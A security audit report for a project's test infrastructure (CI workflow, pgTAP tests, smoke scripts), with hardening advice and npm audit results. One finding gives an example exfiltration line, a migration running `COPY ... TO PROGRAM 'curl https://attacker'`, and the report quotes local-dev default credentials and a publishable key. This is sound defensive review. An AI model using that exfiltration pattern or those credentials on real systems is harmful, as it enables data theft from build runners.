# Security audit for spec 022

Scope: test-framework infrastructure (jest/jest-expo, pgTAP, shell smokes,
GitHub Actions CI). All surface is dev-tooling — no production runtime
exposure, no new edge functions, no new RPCs, no new tables. The threat
model that matters here is **supply chain + CI side-channel** (a malicious
PR trying to exfiltrate secrets or RCE the runner) plus the usual
"committed-credentials" sweep.

Files audited:
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/.github/workflows/test.yml`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/scripts/test-db.sh`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/scripts/smoke-rpc.sh`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/tests/jest.setup.ts`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/supabase/tests/inventory_counts_set_submitted_by.test.sql`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/supabase/tests/report_run_cogs.test.sql`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/tests/README.md`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/jest.config.js`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/tsconfig.test.json`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/tsconfig.json`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/CLAUDE.md` (one-line edit)
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/package.json` (dep additions)
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/src/components/cmd/StatusPill.test.tsx`
- `/Users/will/Documents/GitHub/INVENTORY-MANAGEMENT/src/utils/relativeTime.test.ts`

## Critical (BLOCKS merge)

None.

## High (must fix before deploy)

None.

## Medium

- `/.github/workflows/test.yml` (no `permissions:` block) — the workflow
  does not declare an explicit `permissions:` block, so it inherits the
  repository default for `GITHUB_TOKEN`. That default is configurable at
  the org/repo level and may grant `contents: write`, `pull-requests:
  write`, etc. — broader than this workflow needs. Although no secrets
  are referenced and only `pull_request` (not `pull_request_target`) is
  used — so secret exfiltration on fork PRs is not in scope — adding an
  explicit minimum-privilege block is a cheap defense in depth. Fix: add
  to the top of `test.yml`:

  ```yaml
  permissions:
    contents: read
  ```

  This locks `GITHUB_TOKEN` to read-only regardless of repo defaults and
  matches the principle-of-least-privilege guidance from GitHub. Not
  blocking — the workflow does no token-using operations (no `gh`
  commands, no commit/push, no comment posting) — but worth a one-line
  fix on first iteration.

## Low

- `/.github/workflows/test.yml:27,30,48` — third-party actions are
  pinned to **major-version tags** (`actions/checkout@v4`,
  `actions/setup-node@v4`, `supabase/setup-cli@v1`), not commit SHAs.
  Tag-pinned actions can be silently moved by a repo owner with write
  access to the action. The first two are GitHub-owned and low-risk;
  `supabase/setup-cli@v1` is third-party (Supabase Inc.) and a higher-
  trust target. For an internal admin tool with no secrets exposed
  through this workflow, tag-pinning is acceptable for v1. Fix
  (optional): pin to SHA — e.g. `uses: supabase/setup-cli@<40-char-sha>
  # v1.x.y`. Recommend revisiting once the workflow is used for
  publishing/deploying (i.e. once it has access to a secret it could
  exfiltrate). Source: OWASP CICD-SEC-4.

- `/scripts/smoke-rpc.sh:45,47-48,54` — committed default credentials
  for `admin@local.test` / `password` and the local-stack publishable
  anon key `sb_publishable_ACJWlzQHlZjBrEguHvfOxg_3BJgxAaH`. These are
  the local-dev defaults baked into `supabase/seed.sql:6,39-40` and
  printed by `supabase status` on a fresh `supabase start` (verified —
  `npx supabase status` on this checkout prints the same publishable
  key). They have no production reach: a fresh `supabase start` on any
  machine generates the same stable defaults bound to `127.0.0.1:54321`.
  The script's `SUPABASE_URL` default is also local
  (`http://127.0.0.1:54321`), so even with a remote `SUPABASE_URL=...`
  override, the operator has to know the *remote* anon key and *remote*
  admin password to do anything — these defaults won't authenticate. No
  finding to fix. Flagging because secret-scanners may flag the literal
  publishable-key prefix; recommend adding an inline comment
  (`# Local-only — this is supabase start's stable publishable key`) at
  line 45 to short-circuit reviewer confusion. The existing comment at
  lines 43-45 already explains this, so this is purely advisory.

- `/scripts/smoke-rpc.sh:69-72` — the login flow sends the password to
  `${SUPABASE_URL}/auth/v1/token?grant_type=password` via curl. If a
  contributor exports `SUPABASE_URL=https://prod...` plus
  `ADMIN_PASSWORD=<real-prod-password>` they'd send a real password to
  prod from a smoke script. The current shape requires the contributor
  to be explicit (they have to set env vars), so this is "do not
  misconfigure"-grade rather than a defect. Optional hardening: refuse
  to run with the default `admin@local.test` against any non-localhost
  `SUPABASE_URL` (sanity-check `[[ "$SUPABASE_URL" == *"127.0.0.1"* ||
  "$SUPABASE_URL" == *"localhost"* ]]` or require `ADMIN_TOKEN` to be
  set when `SUPABASE_URL` is remote). Defer to a follow-up if the team
  decides smoke-against-remote is a real workflow.

- `/scripts/test-db.sh:88-92` — `docker exec -i $CONTAINER psql ... -f -
  < "$f"` streams `.test.sql` files into the local Postgres container as
  the postgres superuser. The script intentionally runs as the
  superuser to make pgTAP `set_config('request.jwt.claims', ...)`
  spoofing work — that's the correct design for a DB test runner, not a
  vulnerability. The risk surface is "a contributor commits a malicious
  `.test.sql` that drops tables or exfils the seed" — which is fully
  contained to the local stack (no prod reach) and is the same trust
  boundary as any committed migration. Defense in depth is already in
  the file shape: every example test wraps in `begin; ... rollback;`.
  No fix needed; documenting because future reviewers may flag the
  superuser exec and miss the rollback framing.

- `/supabase/tests/inventory_counts_set_submitted_by.test.sql:33-43`,
  `/supabase/tests/report_run_cogs.test.sql:33-46` — JWT-claim spoofing
  uses hardcoded seed UUIDs (`22222222...`, `33333333...`) constants in
  the test file, NOT real production UUIDs. Verified the manager
  (`22222222`) and master (`33333333`) UUIDs are defined as constants
  in `supabase/seed.sql:79,131` — they're stable local-seed values, not
  prod identities. Stores are looked up by name (`select id from
  public.stores where name = 'Frederick'`) per the architect's seed-
  drift mitigation. No PII. No fix.

- `/.github/workflows/test.yml:55,62` — `supabase start` in CI boots the
  full local stack inside the GHA runner sandbox. The runner has
  outbound network access by default; if a malicious migration tried to
  `COPY ... TO PROGRAM 'curl https://attacker'` it would succeed at the
  network layer. Mitigation: this is the same trust boundary as any
  committed migration — only a maintainer (or someone whose PR a
  maintainer accepts to merge) can land such a migration. `pull_request`
  trigger means fork PRs from unknown contributors run with NO secrets,
  so even if they hijacked the runner they'd find nothing to exfiltrate.
  Acceptable for v1. Worth knowing once the workflow grows secret usage.

## Dependencies

`npm audit --audit-level=high` summary:

```
11 vulnerabilities (5 low, 5 moderate, 1 high)
```

Provenance of each vuln vs. spec 022:

| Package                  | Severity | Chain                                                                       | New from spec 022? |
| ------------------------ | -------- | --------------------------------------------------------------------------- | ------------------ |
| `@xmldom/xmldom`         | high     | `expo` → `@expo/cli` → `@expo/plist` (build-time iOS plist parsing)         | **No** — pre-existing on `main` via `expo@^54`. |
| `expo`                   | moderate | self                                                                        | No — pre-existing. |
| `@expo/cli`              | moderate | `postcss`                                                                   | No — pre-existing. |
| `@expo/metro-config`     | moderate | `postcss`                                                                   | No — pre-existing. |
| `postcss`                | moderate | `@expo/metro-config` → `@expo/cli`                                          | No — pre-existing. |
| `dompurify`              | moderate | (`jspdf` transitive)                                                        | No — pre-existing. |
| `@tootallnate/once`      | low      | `http-proxy-agent` → `jsdom` → `jest-environment-jsdom` → `jest-expo`       | **Yes** — added by jest-expo. |
| `http-proxy-agent`       | low      | (same chain as above)                                                       | **Yes** — added by jest-expo. |
| `jsdom`                  | low      | (same chain as above)                                                       | **Yes** — added by jest-expo. |
| `jest-environment-jsdom` | low      | `jest-expo`                                                                 | **Yes** — added by jest-expo. |
| `jest-expo`              | low      | direct devDep                                                               | **Yes** — added by this spec. |

**New vulns introduced by spec 022**: 5 LOW-severity, all in the
`jest-expo` → `jest-environment-jsdom` → `jsdom` → `http-proxy-agent`
chain. All of them are **dev-only, test-time only** — they never run in
production, never run in CI for fork PRs (no secrets), and the
underlying `http-proxy-agent` flaw (CWE-705, control-flow scoping) only
matters when jsdom proxies an HTTP request, which jest tests in this
repo do not do (tests mock at the `db.ts` boundary per architect §2;
they don't hit network).

**High-severity vuln (`@xmldom/xmldom`)**: pre-existing, transitive of
`expo`'s iOS-build tooling. Not addressable by this spec — fix would
require an `expo` major upgrade (audit fix says `expo@49.0.23`, which
is a downgrade from the current `expo@54` — likely an audit-fix bug,
since `expo@54` already includes the only `@expo/plist` available).
Not new from spec 022 and not blocking. Document in a follow-up
"dependency hygiene" spec; do NOT auto-`npm audit fix --force` (it
proposes major version bumps to `jest-expo@47` and `expo@49` — both
breaking).

**Bottom line on deps**: spec 022 introduces 5 low-severity, test-only
vulns. None are critical, none have a runtime path to production, none
are addressable without dropping `jest-expo` (which would defeat the
spec). Acceptable.

## Sanity check against project-specific rules (CLAUDE.md)

- **RLS — every new table needs policies**: no new tables in this spec.
  Verified — only test files under `supabase/tests/` and one
  pgTAP `create extension if not exists pgtap;` per test (extension is
  per-database, not per-table). N/A.

- **Edge functions — `verify_jwt` and service-token validation**: no
  new edge functions in `supabase/functions/` and no `verify_jwt` /
  service-token changes. Verified. N/A.

- **Secrets**: no service-role keys, no third-party API keys committed.
  The only literal "key" in scope is the local-dev `sb_publishable_...`
  in `scripts/smoke-rpc.sh:45`, which is the local `supabase start`
  stable publishable anon key (verified by running `npx supabase status`
  — it matches). This is publishable by design (it's the public
  client-key half of the JWT-anon pair), generated deterministically by
  Supabase CLI on every fresh stack. Safe to commit. The pre-existing
  `scripts/smoke-edge.sh:31` similarly defaults `SUPABASE_URL` to the
  prod project URL — that's a project URL, not a key.

- **PII and data exposure**: tests assert against seed data (286 KB
  prod-shaped seed pulled 2026-05-02). The assertions use
  `select id from public.stores where name = 'Frederick'` style lookups
  rather than hardcoded seed UUIDs (verified —
  `report_run_cogs.test.sql:39-40` and
  `inventory_counts_set_submitted_by.test.sql:38`). User UUIDs ARE
  hardcoded (`22222222...` / `33333333...`) but those are the seed-
  stable constants from `supabase/seed.sql:79,131`, not real production
  user identifiers. No PII leak.

- **Input validation**: test files do build pgTAP `format()` strings
  with `current_setting()` interpolation
  (`report_run_cogs.test.sql:68-72`). The interpolated value is set via
  `set_config('test.charles_id', v_charles::text, true)` from a
  controlled `select id from public.stores where name = 'Charles'`. No
  attacker-controlled input flows into the `format()` call — the source
  is the seed table the test owns. Not a SQLi risk.

- **Auth flow / realtime**: no realtime publication changes, no
  membership in `supabase_realtime`. Verified via spec §13.

- **CI assumption**: `.github/workflows/test.yml` is in this spec — so
  the long-pending `db-migrations-applied.yml` reference in README is
  now actually behind a real workflow. Spec acknowledges the
  workflow-scoped token issue (per CLAUDE.md "CI workflow") — the
  developer notes say the user pushes the workflow manually if the
  token issue persists. Reviewer notes the README still references the
  old `db-migrations-applied.yml`; the developer caveats that as an
  intentional deferral. Not a security concern.

## Closing

No Critical or High findings. The five Medium-or-below items are all
defense-in-depth / hygiene suggestions, none of which block ship. Spec
022 introduces 5 low-severity test-only npm vulns that have no
production-runtime path. The one pre-existing high-severity vuln
(`@xmldom/xmldom` via expo build-time tooling) is unaddressed and not
caused by this spec — pursue in a follow-up "dependency hygiene" spec.

Recommend: add `permissions: { contents: read }` to `test.yml` (1
line) on first iteration; the rest can be deferred.
